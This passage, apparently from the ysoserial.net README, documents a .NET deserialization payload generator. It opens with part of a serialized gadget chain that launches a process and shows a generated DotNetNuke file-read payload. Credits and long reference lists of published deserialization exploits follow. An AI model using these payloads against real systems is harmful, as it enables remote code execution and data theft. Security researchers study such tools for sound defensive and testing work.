WFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0AAAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs=&amp;lt;/anyType&amp;gt;&amp;lt;/MethodParameters&amp;gt;&amp;lt;ObjectInstance xsi:type=&#34;ObjectStateFormatter&#34;&amp;gt;&amp;lt;/ObjectInstance&amp;gt;&amp;lt;/ProjectedProperty0&amp;gt;&amp;lt;/ExpandedWrapperOfObjectStateFormatterObjectDataProvider&amp;gt;&amp;lt;/item&amp;gt;&amp;lt;/profile&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Generate a read_file payload for DotNetNuke using its plugin&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini&#xA;&amp;lt;profile&amp;gt;&amp;lt;item key=&#34;name1: key1&#34; type=&#34;System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#34;&amp;gt;&amp;lt;ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd=&#34;http://www.w3.org/2001/XMLSchema&#34; xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;&amp;gt;&amp;lt;ExpandedElement/&amp;gt;&amp;lt;ProjectedProperty0&amp;gt;&amp;lt;MethodName&amp;gt;WriteFile&amp;lt;/MethodName&amp;gt;&amp;lt;MethodParameters&amp;gt;&amp;lt;anyType xsi:type=&#34;xsd:string&#34;&amp;gt;win.ini&amp;lt;/anyType&amp;gt;&amp;lt;/MethodParameters&amp;gt;&amp;lt;ObjectInstance xsi:type=&#34;FileSystemUtils&#34;&amp;gt;&amp;lt;/ObjectInstance&amp;gt;&amp;lt;/ProjectedProperty0&amp;gt;&amp;lt;/ExpandedWrapperOfFileSystemUtilsObjectDataProvider&amp;gt;&amp;lt;/item&amp;gt;&amp;lt;/profile&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;v2 Branch&lt;/h2&gt; &#xA;&lt;p&gt;v2 branch is a copy of ysoserial.net (15/03/2018) that has been changed to work with .NET Framework 2.0 by &lt;a href=&#34;https://github.com/irsdl&#34;&gt;irsdl&lt;/a&gt;. Although this project can be used with applications that use .NET Framework v2.0, it also requires .NET Framework 3.5 to be installed on the target box as the gadgets depend on it. This problem will be resolved if new gadgets in .NET Framework 2.0 become identified in the future.&lt;/p&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Fork it&lt;/li&gt; &#xA; &lt;li&gt;Create your feature branch (&lt;code&gt;git checkout -b my-new-feature&lt;/code&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Commit your changes (&lt;code&gt;git commit -am &#39;Add some feature&#39;&lt;/code&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Push to the branch (&lt;code&gt;git push origin my-new-feature&lt;/code&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Create new Pull Request&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Thanks&lt;/h2&gt; &#xA;&lt;p&gt;Special thanks to all contributors:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/olekmirosh&#34;&gt;Oleksandr Mirosh&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/irsdl&#34;&gt;irsdl&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/JarLob&#34;&gt;JarLob&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/DS-Kurt-Boberg&#34;&gt;DS-Kurt-Boberg&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/mwulftange&#34;&gt;mwulftange&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/yallie&#34;&gt;yallie&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/paralax&#34;&gt;paralax&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Credits&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./ysoserial.exe --credit&#xA;&#xA;ysoserial.net has been developed by Alvaro Muñoz (@pwntester)&#xA;&#xA;Credits for available gadgets:&#xA;&#x9;ActivitySurrogateDisableTypeCheck&#xA;&#x9;&#x9;[Finders: Nick Landers]&#xA;&#x9;ActivitySurrogateSelector&#xA;&#x9;&#x9;[Finders: James Forshaw] [Contributors: Alvaro Munoz, zcgonvh]&#xA;&#x9;ActivitySurrogateSelectorFromFile&#xA;&#x9;&#x9;[Finders: James Forshaw] [Contributors: Alvaro Munoz, zcgonvh]&#xA;&#x9;AxHostState&#xA;&#x9;&#x9;[Finders: Soroush Dalili]&#xA;&#x9;ClaimsIdentity&#xA;&#x9;&#x9;[Finders: Soroush Dalili]&#xA;&#x9;DataSet&#xA;&#x9;&#x9;[Finders: James Forshaw] [Contributors: Soroush Dalili]&#xA;&#x9;ObjectDataProvider&#xA;&#x9;&#x9;[Finders: Oleksandr Mirosh, Alvaro Munoz] [Contributors: Alvaro Munoz, Soroush Dalili, Dane Evans]&#xA;&#x9;PSObject&#xA;&#x9;&#x9;[Finders: Oleksandr Mirosh, Alvaro Munoz] [Contributors: Alvaro Munoz]&#xA;&#x9;ResourceSet&#xA;&#x9;&#x9;[Finders: Soroush Dalili]&#xA;&#x9;RolePrincipal&#xA;&#x9;&#x9;[Finders: Soroush Dalili]&#xA;&#x9;SessionSecurityToken&#xA;&#x9;&#x9;[Finders: @mufinnnnnnn, Soroush Dalili] [Contributors: Soroush Dalili]&#xA;&#x9;SessionViewStateHistoryItem&#xA;&#x9;&#x9;[Finders: Soroush Dalili]&#xA;&#x9;TextFormattingRunProperties&#xA;&#x9;&#x9;[Finders: Oleksandr Mirosh and Alvaro Munoz] [Contributors: Oleksandr Mirosh, Soroush Dalili]&#xA;&#x9;ToolboxItemContainer&#xA;&#x9;&#x9;[Finders: @frycos]&#xA;&#x9;TypeConfuseDelegate&#xA;&#x9;&#x9;[Finders: James Forshaw] [Contributors: Alvaro Munoz]&#xA;&#x9;TypeConfuseDelegateMono&#xA;&#x9;&#x9;[Finders: James Forshaw] [Contributors: Denis Andzakovic]&#xA;&#x9;WindowsClaimsIdentity&#xA;&#x9;&#x9;[Finders: Soroush Dalili]&#xA;&#x9;WindowsIdentity&#xA;&#x9;&#x9;[Finders: Levi Broderick] [Contributors: Alvaro Munoz, Soroush Dalili]&#xA;&#x9;WindowsPrincipal&#xA;&#x9;&#x9;[Finders: Steven Seeley of Qihoo 360 Vulcan Team] [Contributors: Chris Anastasio]&#xA;&#xA;Credits for available plugins:&#xA;&#x9;ActivatorUrl&#xA;&#x9;&#x9;Harrison Neal&#xA;&#x9;Altserialization&#xA;&#x9;&#x9;Soroush Dalili&#xA;&#x9;ApplicationTrust&#xA;&#x9;&#x9;Soroush Dalili&#xA;&#x9;Clipboard&#xA;&#x9;&#x9;Soroush Dalili&#xA;&#x9;DotNetNuke&#xA;&#x9;&#x9;discovered by Oleksandr Mirosh and Alvaro Munoz, implemented by Alvaro Munoz, tested by @GlitchWitch&#xA;&#x9;Resx&#xA;&#x9;&#x9;Soroush Dalili&#xA;&#x9;SessionSecurityTokenHandler&#xA;&#x9;&#x9;Soroush Dalili&#xA;&#x9;SharePoint&#xA;&#x9;&#x9;CVE-2018-8421: Soroush Dalili, CVE-2019-0604: Markus Wulftange, CVE-2020-1147: Oleksandr Mirosh, Markus Wulftange, Jonathan Birch, Steven Seeley (write-up)  - implemented by Soroush Dalili&#xA;&#x9;TransactionManagerReenlist&#xA;&#x9;&#x9;Soroush Dalili&#xA;&#x9;ViewState&#xA;&#x9;&#x9;Soroush Dalili&#xA;&#xA;Various other people have also donated their time and contributed to this project.&#xA;Please see https://github.com/pwntester/ysoserial.net/graphs/contributors to find those who have helped developing more features or have fixed bugs.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Additional Reading&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://speakerdeck.com/pwntester/attacking-net-serialization&#34;&gt;Attacking .NET serialization&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf&#34;&gt;Friday the 13th: JSON Attacks - Slides&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf&#34;&gt;Friday the 13th: JSON Attacks - Whitepaper&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=ZBfBYoK_Wr0&#34;&gt;Friday the 13th: JSON Attacks - Video(demos)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_Slides.pdf&#34;&gt;Are you my Type? - Slides&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf&#34;&gt;Are you my Type? - Whitepaper&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://googleprojectzero.blogspot.com.es/2017/04/exploiting-net-managed-dcom.html&#34;&gt;Exploiting .NET Managed DCOM&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/tyranid/ExploitRemotingService&#34;&gt;Exploit Remoting Service &lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://web.archive.org/web/20190330065542/https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/march/finding-and-exploiting-.net-remoting-over-http-using-deserialisation/&#34;&gt;Finding and Exploiting .NET Remoting over HTTP using Deserialisation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://codewhitesec.blogspot.com/2022/01/dotnet-remoting-revisited.html&#34;&gt;.NET Remoting Revisited&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html&#34;&gt;Bypassing .NET Serialization Binders&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;ysoserial.net references in the wild&lt;/h2&gt; &#xA;&lt;h3&gt;Research:&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.alphabot.com/security/blog/2017/net/How-to-configure-Json.NET-to-create-a-vulnerable-web-API.html&#34;&gt;https://www.alphabot.com/security/blog/2017/net/How-to-configure-Json.NET-to-create-a-vulnerable-web-API.html&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://web.archive.org/web/20190401191940/https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/december/beware-of-deserialisation-in-.net-methods-and-classes-code-execution-via-paste/&#34;&gt;https://web.archive.org/web/20190401191940/https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/december/beware-of-deserialisation-in-.net-methods-and-classes-code-execution-via-paste/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://web.archive.org/web/20190330065542/https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/march/finding-and-exploiting-.net-remoting-over-http-using-deserialisation/&#34;&gt;https://web.archive.org/web/20190330065542/https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/march/finding-and-exploiting-.net-remoting-over-http-using-deserialisation/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://web.archive.org/web/20180903005001/https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/august/aspnet-resource-files-resx-and-deserialisation-issues/&#34;&gt;https://web.archive.org/web/20180903005001/https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/august/aspnet-resource-files-resx-and-deserialisation-issues/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://web.archive.org/web/20191210003556/https://www.nccgroup.trust/uk/our-research/use-of-deserialisation-in-.net-framework-methods-and-classes/&#34;&gt;https://web.archive.org/web/20191210003556/https://www.nccgroup.trust/uk/our-research/use-of-deserialisation-in-.net-framework-methods-and-classes/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://community.microfocus.com/t5/Security-Research-Blog/New-NET-deserialization-gadget-for-compact-payload-When-size/ba-p/1763282&#34;&gt;https://community.microfocus.com/t5/Security-Research-Blog/New-NET-deserialization-gadget-for-compact-payload-When-size/ba-p/1763282&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/&#34;&gt;https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817&#34;&gt;https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://research.nccgroup.com/2019/08/23/getting-shell-with-xamlx-files/&#34;&gt;https://research.nccgroup.com/2019/08/23/getting-shell-with-xamlx-files/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://soroush.secproject.com/blog/2019/08/uploading-web-config-for-fun-and-profit-2/&#34;&gt;https://soroush.secproject.com/blog/2019/08/uploading-web-config-for-fun-and-profit-2/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mdsec.co.uk/2020/04/introducing-ysoserial-net-april-2020-improvements/&#34;&gt;https://www.mdsec.co.uk/2020/04/introducing-ysoserial-net-april-2020-improvements/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.netspi.com/blog/technical/adversary-simulation/re-animating-activitysurrogateselector/&#34;&gt;https://www.netspi.com/blog/technical/adversary-simulation/re-animating-activitysurrogateselector/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Usage:&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cert.360.cn/warning/detail?id=e689288863456481733e01b093c986b6&#34;&gt;https://cert.360.cn/warning/detail?id=e689288863456481733e01b093c986b6&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.redteam-pentesting.de/de/advisories/rt-sa-2017-014/-cyberark-password-vault-web-access-remote-code-execution&#34;&gt;https://www.redteam-pentesting.de/de/advisories/rt-sa-2017-014/-cyberark-password-vault-web-access-remote-code-execution&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://labs.mwrinfosecurity.com/advisories/milestone-xprotect-net-deserialization-vulnerability/&#34;&gt;https://labs.mwrinfosecurity.com/advisories/milestone-xprotect-net-deserialization-vulnerability/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://soroush.secproject.com/blog/2018/12/story-of-two-published-rces-in-sharepoint-workflows/&#34;&gt;https://soroush.secproject.com/blog/2018/12/story-of-two-published-rces-in-sharepoint-workflows/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://srcincite.io/blog/2018/08/31/you-cant-contain-me-analyzing-and-exploiting-an-elevation-of-privilege-in-docker-for-windows.html&#34;&gt;https://srcincite.io/blog/2018/08/31/you-cant-contain-me-analyzing-and-exploiting-an-elevation-of-privilege-in-docker-for-windows.html&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.zerodayinitiative.com/blog/2018/8/14/voicemail-vandalism-getting-remote-code-execution-on-microsoft-exchange-server&#34;&gt;https://www.zerodayinitiative.com/blog/2018/8/14/voicemail-vandalism-getting-remote-code-execution-on-microsoft-exchange-server&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.synacktiv.com/ressources/advisories/Sitecore_CSRF_deserialize_RCE.pdf&#34;&gt;https://www.synacktiv.com/ressources/advisories/Sitecore_CSRF_deserialize_RCE.pdf&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.zerodayinitiative.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability&#34;&gt;https://www.zerodayinitiative.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.zerodayinitiative.com/blog/2019/10/23/cve-2019-1306-are-you-my-index&#34;&gt;https://www.zerodayinitiative.com/blog/2019/10/23/cve-2019-1306-are-you-my-index&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://labs.withsecure.com/blog/autocad-designing-a-kill-chain/&#34;&gt;https://labs.withsecure.com/blog/autocad-designing-a-kill-chain/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.nccgroup.trust/uk/our-research/technical-advisory-multiple-vulnerabilities-in-smartermail/&#34;&gt;https://www.nccgroup.trust/uk/our-research/technical-advisory-multiple-vulnerabilities-in-smartermail/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.nccgroup.trust/uk/our-research/technical-advisory-code-execution-by-viewing-resource-files-in-net-reflector/&#34;&gt;https://www.nccgroup.trust/uk/our-research/technical-advisory-code-execution-by-viewing-resource-files-in-net-reflector/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.devsecurity.eu/en/blog/dnspy-deserialization-vulnerability&#34;&gt;https://blog.devsecurity.eu/en/blog/dnspy-deserialization-vulnerability&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/&#34;&gt;https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys&#34;&gt;https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.thezdi.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters&#34;&gt;https://www.thezdi.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mdsec.co.uk/2020/05/analysis-of-cve-2020-0605-code-execution-using-xps-files-in-net/&#34;&gt;https://www.mdsec.co.uk/2020/05/analysis-of-cve-2020-0605-code-execution-using-xps-files-in-net/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html&#34;&gt;https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://srcincite.io/pocs/cve-2020-16952.py.txt&#34;&gt;https://srcincite.io/pocs/cve-2020-16952.py.txt&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters&#34;&gt;https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.modzero.com/modlog/archives/2020/06/16/mz-20-03_-_new_security_advisory_regarding_vulnerabilities_in__net/index.html&#34;&gt;https://www.modzero.com/modlog/archives/2020/06/16/mz-20-03_-_new_security_advisory_regarding_vulnerabilities_in__net/index.html&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys&#34;&gt;https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.zerodayinitiative.com/blog/2021/6/1/cve-2021-31181-microsoft-sharepoint-webpart-interpretation-conflict-remote-code-execution-vulnerability&#34;&gt;https://www.zerodayinitiative.com/blog/2021/6/1/cve-2021-31181-microsoft-sharepoint-webpart-interpretation-conflict-remote-code-execution-vulnerability&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.liquidsec.net/2021/06/01/asp-net-cryptography-for-pentesters/&#34;&gt;https://blog.liquidsec.net/2021/06/01/asp-net-cryptography-for-pentesters/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://peterjson.medium.com/some-notes-about-microsoft-exchange-deserialization-rce-cve-2021-42321-110d04e8852&#34;&gt;https://peterjson.medium.com/some-notes-about-microsoft-exchange-deserialization-rce-cve-2021-42321-110d04e8852&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mdsec.co.uk/2021/09/nsa-meeting-proposal-for-proxyshell/&#34;&gt;https://www.mdsec.co.uk/2021/09/nsa-meeting-proposal-for-proxyshell/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@frycos/searching-for-deserialization-protection-bypasses-in-microsoft-exchange-cve-2022-21969-bfa38f63a62d&#34;&gt;https://medium.com/@frycos/searching-for-deserialization-protection-bypasses-in-microsoft-exchange-cve-2022-21969-bfa38f63a62d&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.zerodayinitiative.com/blog/2021/3/17/cve-2021-27076-a-replay-style-deserialization-attack-against-sharepoint&#34;&gt;https://www.zerodayinitiative.com/blog/2021/3/17/cve-2021-27076-a-replay-style-deserialization-attack-against-sharepoint&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.assetnote.io/2021/11/02/sitecore-rce/&#34;&gt;https://blog.assetnote.io/2021/11/02/sitecore-rce/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://web.archive.org/web/20220619183339/https://starlabs.sg/blog/2022/05/new-wine-in-old-bottle-microsoft-sharepoint-post-auth-deserialization-rce-cve-2022-29108/&#34;&gt;https://web.archive.org/web/20220619183339/https://starlabs.sg/blog/2022/05/new-wine-in-old-bottle-microsoft-sharepoint-post-auth-deserialization-rce-cve-2022-29108/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gmo-cybersecurity.com/blog/net-remoting-english/&#34;&gt;https://gmo-cybersecurity.com/blog/net-remoting-english/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mdsec.co.uk/2022/03/abc-code-execution-for-veeam/&#34;&gt;https://www.mdsec.co.uk/2022/03/abc-code-execution-for-veeam/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mandiant.com/resources/hunting-deserialization-exploits&#34;&gt;https://www.mandiant.com/resources/hunting-deserialization-exploits&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://mogwailabs.de/en/blog/2022/01/vulnerability-spotlight-rce-in-ajax.net-professional/&#34;&gt;https://mogwailabs.de/en/blog/2022/01/vulnerability-spotlight-rce-in-ajax.net-professional/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Talks:&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf&#34;&gt;https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a 